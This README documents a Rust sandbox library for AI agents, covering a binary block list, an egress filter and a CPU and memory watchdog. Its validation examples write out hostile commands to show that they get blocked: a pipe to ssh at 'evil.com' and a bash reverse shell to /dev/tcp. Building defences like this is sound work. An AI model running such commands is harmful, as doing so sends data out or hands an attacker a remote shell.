# laminae-ironclad

Process-level execution sandbox for AI agents. Three hard constraints enforced on all spawned sub-processes.

Part of the [Laminae](https://github.com/Orellius/laminae) SDK.

## The Three Layers

### 1. Command Whitelist

Only approved binaries can execute. Permanently blocked: SSH, curl, wget, compilers, package managers, crypto miners, container tools.

```rust
use laminae_ironclad::validate_binary;

validate_binary("git")?;   // OK
validate_binary("ls")?;    // OK
validate_binary("ssh")?;   // Error: permanently blocked
validate_binary("curl")?;  // Error: permanently blocked
validate_binary("npm")?;   // Error: permanently blocked
```

### 2. Network Egress Filter

Wraps commands in a macOS `sandbox-exec` profile — no inbound connections, outbound restricted to localhost and whitelisted hosts.

```rust
use laminae_ironclad::sandboxed_command;

let mut cmd = sandboxed_command("git", &["status"], "/path/to/project")?;
let child = cmd.spawn()?;
```

### 3. Resource Watchdog

Background monitor polls CPU and memory. Sends SIGKILL if thresholds are exceeded for a sustained period.

```rust
use laminae_ironclad::{spawn_watchdog, WatchdogConfig};

let config = WatchdogConfig {
    cpu_threshold: 90.0,        // 90% CPU
    memory_threshold_mb: 4096,  // 4 GB
    max_wall_time: std::time::Duration::from_secs(1800), // 30 min
    ..Default::default()
};

let cancel = spawn_watchdog(child_pid, config, "my-agent".into());
// Set cancel to true to stop monitoring
```

## Deep Command Validation

Catches piped commands, subshells, and reverse shell patterns:

```rust
use laminae_ironclad::validate_command_deep;

validate_command_deep("cat file.txt | sort | uniq")?;           // OK
validate_command_deep("echo test | ssh user@evil.com")?;        // Blocked
validate_command_deep("bash -i >& /dev/tcp/evil/4444 0>&1")?;   // Blocked
```

## Custom Configuration

```rust
use laminae_ironclad::IroncladConfig;

let config = IroncladConfig {
    extra_blocked: vec!["my_dangerous_tool".into()],
    allowlist: vec!["ls".into(), "cat".into(), "my_safe_tool".into()],
    whitelisted_hosts: vec!["api.myservice.com".into()],
    ..Default::default()
};
```

## Platform Support

- **macOS** — Full support (`sandbox-exec` + process monitoring)
- **Linux** — Planned (seccomp-bpf / landlock)

## License

Apache-2.0 — see [LICENSE](../../LICENSE).
